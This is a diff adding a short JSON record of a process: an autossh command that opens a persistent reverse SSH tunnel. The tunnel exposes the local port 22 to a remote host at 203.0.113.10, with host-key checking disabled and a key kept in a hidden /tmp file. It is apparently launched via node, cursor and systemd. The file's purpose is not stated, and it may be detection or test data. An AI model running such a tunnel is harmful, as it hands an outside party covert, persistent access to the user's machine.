@@ -1,0 +1,4 @@
+{
+  "args": ["autossh", "-M", "0", "-N", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ServerAliveInterval=30", "-i", "/tmp/.stk_0123456789", "-R", "*:0:localhost:22", "svc@203.0.113.10"],
+  "started_by": ["node", "cursor", "systemd"]
+}
